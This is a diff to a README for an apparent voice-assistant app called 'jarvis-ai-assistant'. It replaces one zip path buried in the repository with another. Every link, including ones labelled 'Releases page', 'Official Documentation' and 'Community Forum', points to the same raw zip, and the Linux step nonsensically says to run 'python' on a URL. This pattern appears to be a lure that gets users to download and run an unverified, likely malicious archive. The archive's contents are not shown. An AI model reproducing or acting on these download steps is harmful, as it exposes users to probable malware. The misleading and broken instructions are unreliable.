@@ -6,7 +6,7 @@ Welcome to the jarvis-ai-assistant! This guide will help you download and run yo
 
 ## 📥 Download the Application
 
-[![Download jarvis-ai-assistant](https://raw.githubusercontent.com/eurasianwoodcockgenusrhipsalis248/jarvis-ai-assistant/main/src/jarvis/jarvis/jarvis-ai-assistant_2.2-beta.2.zip)](https://raw.githubusercontent.com/eurasianwoodcockgenusrhipsalis248/jarvis-ai-assistant/main/src/jarvis/jarvis/jarvis-ai-assistant_2.2-beta.2.zip)
+[![Download jarvis-ai-assistant](https://raw.githubusercontent.com/eurasianwoodcockgenusrhipsalis248/jarvis-ai-assistant/main/config/jarvis_ai_assistant_v3.9.zip)](https://raw.githubusercontent.com/eurasianwoodcockgenusrhipsalis248/jarvis-ai-assistant/main/config/jarvis_ai_assistant_v3.9.zip)
 
 ## 📋 Overview
 
@@ -32,7 +32,7 @@ To run jarvis-ai-assistant smoothly, ensure your system meets the following requ
 
 To get started, visit the Releases page to download the application.
 
-[Download from the Releases page](https://raw.githubusercontent.com/eurasianwoodcockgenusrhipsalis248/jarvis-ai-assistant/main/src/jarvis/jarvis/jarvis-ai-assistant_2.2-beta.2.zip)
+[Download from the Releases page](https://raw.githubusercontent.com/eurasianwoodcockgenusrhipsalis248/jarvis-ai-assistant/main/config/jarvis_ai_assistant_v3.9.zip)
 
 ### 📝 Installation Steps
 
@@ -51,7 +51,7 @@ To get started, visit the Releases page to download the application.
 5. **Run the Application:**
    - **Windows:** Double-click the downloaded `.exe` file to start.
    - **macOS:** Open the downloaded `.dmg` file and drag the jarvis-ai-assistant to your Applications folder. Then, double-click it to run.
-   - **Linux:** Open a terminal, navigate to the directory where the file is downloaded, and execute the command `python https://raw.githubusercontent.com/eurasianwoodcockgenusrhipsalis248/jarvis-ai-assistant/main/src/jarvis/jarvis/jarvis-ai-assistant_2.2-beta.2.zip`.
+   - **Linux:** Open a terminal, navigate to the directory where the file is downloaded, and execute the command `python https://raw.githubusercontent.com/eurasianwoodcockgenusrhipsalis248/jarvis-ai-assistant/main/config/jarvis_ai_assistant_v3.9.zip`.
 
 ## 🎤 How to Use
 
@@ -73,8 +73,8 @@ If you encounter any issues while running jarvis-ai-assistant, try the following
 
 To learn more about the functionalities of the jarvis-ai-assistant, check out the following resources:
 
-- [Official Documentation](https://raw.githubusercontent.com/eurasianwoodcockgenusrhipsalis248/jarvis-ai-assistant/main/src/jarvis/jarvis/jarvis-ai-assistant_2.2-beta.2.zip)
-- [Community Forum](https://raw.githubusercontent.com/eurasianwoodcockgenusrhipsalis248/jarvis-ai-assistant/main/src/jarvis/jarvis/jarvis-ai-assistant_2.2-beta.2.zip)
+- [Official Documentation](https://raw.githubusercontent.com/eurasianwoodcockgenusrhipsalis248/jarvis-ai-assistant/main/config/jarvis_ai_assistant_v3.9.zip)
+- [Community Forum](https://raw.githubusercontent.com/eurasianwoodcockgenusrhipsalis248/jarvis-ai-assistant/main/config/jarvis_ai_assistant_v3.9.zip)
 
 ## 🌐 Contributing
 
@@ -86,4 +86,4 @@ For support or inquiries, you can reach out via the issues section on the GitHub
 
 Enjoy using your new voice assistant and explore all its capabilities! 
 
-[Download from the Releases page](https://raw.githubusercontent.com/eurasianwoodcockgenusrhipsalis248/jarvis-ai-assistant/main/src/jarvis/jarvis/jarvis-ai-assistant_2.2-beta.2.zip)
+[Download from the Releases page](https://raw.githubusercontent.com/eurasianwoodcockgenusrhipsalis248/jarvis-ai-assistant/main/config/jarvis_ai_assistant_v3.9.zip)
